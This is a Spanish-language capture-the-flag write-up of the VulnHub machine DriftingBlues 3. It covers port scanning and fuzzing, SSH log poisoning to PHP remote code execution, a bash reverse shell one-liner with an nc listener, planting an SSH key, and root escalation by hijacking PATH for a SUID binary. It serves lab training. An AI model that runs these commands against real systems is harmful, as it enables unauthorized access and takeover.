---
title: Driffting Blues 3
date: 2024-07-10
categories: [WRITEUPS, VulnHub]
tags: [log poisoning]  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

Buenas, en esta máquina explotaremos un **Log Poisoning** para derivarlo a un **RCE**, y para la escalada de privilegios nos aprovecharemos del bit **SUID** del binario **getinfo**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos una vez conozcamos la dirección *IP*, será realizar un escaneo con **NMAP**, para comprobar los puertos que tiene abiertos.

```bash
nmap -p- --open -T5 192.168.1.150 -n -Pn -v
```

![picture](/assets/images/vulnhub/db3-1.png){: w="600" h="300" }

A continuación, nos iremos al navegador para ver la página web del servicio **HTTP**.

![picture](/assets/images/vulnhub/db3-2.png)

La página Web parece ser la de un festival de música, no encontramos nada interesante, por lo que a continuación realizaremos **Fuzzing** con **Gobuster** para encontrar entradas que no podamos ver a simple vista.

```bash
gobuster dir -u http://192.168.1.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403
```

![picture](/assets/images/vulnhub/db3-3.png)

En el archivo "**robots.txt**" encontramos la siguiente entrada.

![picture](/assets/images/vulnhub/db3-4.png)

Y a su vez, en la entrada encontrada, nos dice que tienen un problema con el servicio **SSH**, y que miremos en "**/littlequeenofspades.html**".

En la siguiente entrada, encontramos la letra de una canción y una contraseña en **base64**.

![picture](/assets/images/vulnhub/db3-5.png){: w="600" h="300" }

Al decodificarla, nos muestra otra cadena hasheada, el cual volveremos a decodificar, y nos mostrará lo que parece ser un archivo de **log**, con los registros de eventos de las tareas **CRON** y  algunos mensajes con la autenticación **SSH**.

Si intentamos conectarnos mediante **SSH** con un usuario aleatorio llamado "*pwned*", podemos comprobar que el registro se actualiza y sale la conexión no exitosa.

![picture](/assets/images/vulnhub/db3-6.png)

---

## **Explotación**

A continuación, la idea es derivar un **Log Posioning** a un **RCE** (*Remote Code Execution*). Para ello tendremos que introducir código **PHP** en el nombre del usuario mediante la conexción **SSH**.

Al intentar inyectar código **PHP** mediante el usuario de **SSH** nos da un error por caracteres inválidos.

![picture](/assets/images/vulnhub/db3-7.png)

Así que nos iremos a **metasploit**, y usaremos el siguiente **exploit** para que nos deje introducir código **PHP**.

![picture](/assets/images/vulnhub/db3-8.png)

Indicaremos en el nombre, el código en **PHP** por el cual podremos ejecutar comandos en la web, una contraseña cualquiera, y la dirección **IP** de la máquina vulnerable.

![picture](/assets/images/vulnhub/db3-9.png){: w="600" h="300" }

Ejecutamos el exploit, y ya podremos ejecutar comandos con el parámetro que hayamos escogido, en mi caso es "**cmd**".

![picture](/assets/images/vulnhub/db3-10.png)

Ejecutamos el comando id en el navegador, y nos lo muestra.

![picture](/assets/images/vulnhub/db3-11.png)

A continuación, ejecutaremos una **Reverse Shell** en el navegador, mientras que en nuestra máquina local estaremos escuchando con un **Listener** con **ncat**.

1. Máquina local

    ```bash
    nc -nlvp 4444
    ```

2. Navegador

    ```bash
    bash -c "bash -i >%26 /dev/tcp/"Nuestra IP"/4444 0>%261"
    ```

Y acabamos de obtener acceso a la máquina.

![picture](/assets/images/vulnhub/db3-12.png){: w="600" h="300" }

---

## **Escalada de privilegios**

Buscando por la máquina he encontrado que en el directorio del usuario "**robertj**", tenemos permisos de lectura, escritura y ejecución en el directorio ***.ssh***, pero en el directorio se encuentra vacío.

Para poder migrar al usuario "**robertj**", lo que haremos será crear una clave privada y otra pública con el siguiente comando.

```bash
ssh-keygen -t rsa -b 2048 -f id_rsa
```

![picture](/assets/images/vulnhub/db3-13.png){: w="600" h="300" }

Una vez hecho esto, tendremos que introducir el contenido de la clave pública en un archivo llamado "**authorized_keys**".

```bash
cat id_rsa.pub >> authorized_keys
```

A continuación, copiaremos el contenido de la clave privada, crearemos un archivo en nuestra máquina local llamado "**id_rsa**", pegaremos la clave privada, y por último le daremos **permisos 600**.

Entramos mediante **ssh** y la clave privada.

Obtenemos acceso, y podemos leer la primera **flag** de usuario.

![picture](/assets/images/vulnhub/db3-14.png){: w="600" h="300" }

Buscando permisos **SUID** he encontrado el siguiente binario.

![picture](/assets/images/vulnhub/db3-15.png){: w="600" h="300" }

Si lo ejecutamos, podemos comprobar que muestra el contenido de "**/etc/hosts**", y muestra el comando **uname -a**.

![picture](/assets/images/vulnhub/db3-16.png)

Para poder escalar privilegios, nos iremos al directorio "*/tmp/*" y crearemos un archivo llamado ***uname***, el cual dentro obtendrá una bash. Y le damos permisos 777.

![picture](/assets/images/vulnhub/db3-17.png){: w="600" h="300" }

Introduciremos al **PATH** la ruta de **tmp**, para que encuentre antes nuestro archivo que el comando **uname**.

```bash
export PATH=/tmp/:$PATH
```

Ejecutamos el binario, y obtenemos la bash como **root**.

![picture](/assets/images/vulnhub/db3-18.png)

Y podemos leer la segunda flag del usuario **root**.

![picture](/assets/images/vulnhub/db3-19.png){: w="300" h="200" }

